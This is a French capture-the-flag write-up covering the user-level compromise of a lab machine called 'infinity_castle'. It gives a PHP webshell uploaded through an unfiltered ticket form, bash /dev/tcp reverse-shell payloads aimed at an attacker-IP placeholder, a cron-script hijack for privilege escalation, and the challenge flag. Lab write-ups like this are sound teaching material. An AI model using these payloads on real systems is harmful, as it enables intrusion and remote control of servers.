# CTF "Chase your d(a)emons" — Write-up User.txt

**Cible :** 10.10.0.45 (IP changeante après restart, ex. 10.10.0.36 / 10.10.0.50)
**Hostname :** `infinity_castle`
**Thème :** Demon Slayer (Kimetsu no Yaiba)
**Objectif :** obtenir `user.txt`

---

## 1. Reconnaissance web (port 80)

Fuzzing des répertoires avec ffuf :

```bash
ffuf -u http://10.10.0.45/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1
```

Résultats notables :

| Chemin | Status | Commentaire |
|---|---|---|
| `/index` | 200 | Page par défaut |
| `/server-status` | 403 | Apache mod_status, inaccessible |
| `/lower` | 301 | Redirection intéressante |

Le fuzzing récursif sur `/lower/` révèle :
- `/lower/index` (200) — page d'entraînement avec le texte :
  > "Good finding! Now the training is over, you must find the real path"
  > `<!-- 445 is samba, right ? -->`
  > + une image de **Zenitsu** (indice thématique Demon Slayer)
- `/lower/bg` (200) — image de fond

**Indice clé** : le commentaire HTML sur le port 445 est un **piège** — il pousse à penser "Samba" alors qu'il s'agit en réalité d'un second site web.

## 2. Scan complet des ports

```bash
nmap -sC -sV -p- 10.10.0.45
```

```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.68 (Debian)
445/tcp open  http    Apache httpd 2.4.68 (Debian)   <-- pas du SMB !
```

Le port 445 sert bien du **HTTP** (Apache), confirmant le piège de l'indice. C'est un vhost caché, distinct du port 80.

## 3. Découverte du vhost caché

Le nom du challenge ("d(a)emons" = daemon/demons, "true slayer" = Demon Slayer) et le pattern `/lower/` suggèrent une opposition de casse. Fuzzing du port 445 :

```bash
ffuf -u http://10.10.0.45:445/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1
```

→ Découverte de `/upper/admin/login.php`.

## 4. Analyse de l'application web

```bash
curl -i http://10.10.0.45:445/upper/admin/login.php
```

Résultat : une application **AdminLTE** nommée **"Demon Human Food Tracker"**, avec favicon `muzan.jpg` et image de fond thématique Demon Slayer. Formulaire de login classique (`username` / `password`, méthode POST) menant à un dashboard avec un **système de tickets**.

## 5. Exploitation — upload de fichier non filtré

Une fois dans le dashboard (via le système de tickets), le formulaire de création de ticket permet un **upload de fichier sans vérification de type/extension**.

**Webshell PHP utilisé :**

```php
<?php system($_GET['cmd']); ?>
```

Le fichier est uploadé sans bypass nécessaire (pas de filtrage d'extension) et se retrouve accessible directement dans le dossier uploads de l'application (`/upper/uploads/demons/`).

**Exécution de commandes :**

```bash
curl "http://10.10.0.45:445/upper/uploads/demons/5.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmée en tant que `www-data`.

## 6. Reverse shell

Le `?cmd=` ne permettant qu'une commande par requête HTTP (pas de session persistante), un reverse shell a été déclenché via le paramètre `cmd` :

```bash
# listener côté attaquant
nc -lvnp 4444
```

```
# payload (encodé en URL)
bash -c "bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1"
```

## 7. Reconnaissance système

```bash
cat /etc/passwd
```

Seul utilisateur avec un shell valide en dehors de root : **muzan** (`/home/muzan`, `/bin/bash`).

```
ls -la /home/muzan
# Permission denied — il faut pivoter vers cet utilisateur
```

## 8. Privesc www-data → muzan (cron hijacking)

```bash
cat /etc/crontab
```

```
* * * * * muzan /var/www/scripts/immortality_check.sh
```

```bash
ls -la /var/www/scripts/
# drwxr-xr-x  www-data www-data  <- dossier appartient à www-data !
# -rwxr-xr-x  muzan    muzan     immortality_check.sh
```

Le fichier appartient à `muzan`, mais **le dossier parent appartient à `www-data`** (pas de sticky bit) : on peut donc supprimer et recréer le script, qui sera ensuite exécuté par le cron avec les droits de `muzan`.

**Exploitation :**

```bash
rm /var/www/scripts/immortality_check.sh
cat << 'EOF' > /var/www/scripts/immortality_check.sh
#!/bin/bash
bash -c "bash -i >& /dev/tcp/<IP_ATTAQUANT>/4445 0>&1"
EOF
chmod 777 /var/www/scripts/immortality_check.sh
```

```bash
# listener côté attaquant, lancé avant le remplacement
nc -lvnp 4445
```

Après (au plus) 60 secondes, le cron s'exécute et renvoie un shell en tant que `muzan`.

## 9. Récupération du flag

```bash
muzan@infinity_castle:~$ cat user.txt
EPI{j00_H4V3_n0_cH01C3_8UT_t0_90_0n_l1v1n9}
```

---

## Résumé de la chaîne d'exploitation

1. Fuzzing web → `/lower/` (faux indice port 445/Samba)
2. Scan complet des ports → 445 = vrai Apache (vhost caché)
3. Fuzzing du port 445 → `/upper/admin/login.php`
4. App "Demon Human Food Tracker" (AdminLTE) avec système de tickets
5. Upload de fichier non filtré → webshell PHP → RCE `www-data`
6. Reverse shell stabilisé
7. Cron `immortality_check.sh` exécuté par `muzan`, dossier writable par `www-data` → remplacement du script → shell `muzan`
8. `user.txt` récupéré